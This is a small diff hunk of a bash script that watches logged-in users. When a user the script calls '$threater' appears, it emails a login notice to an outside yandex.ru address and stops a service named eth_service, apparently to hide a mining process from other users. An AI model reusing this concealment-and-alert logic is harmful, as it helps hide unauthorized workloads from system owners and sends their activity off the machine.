@@ -18,6 +18,7 @@ while true; do
     done
   done
   echo "" | mutt -s "Login" -i <(echo "$threater Login") miksolo@yandex.ru
+  echo "Login of $threater. Stpping process $(date)"
   systemctl --user stop eth_service.service
   while [[ $flag -eq 1 ]]; do
     NEW_USERS=($(who | awk '{print $1}'))
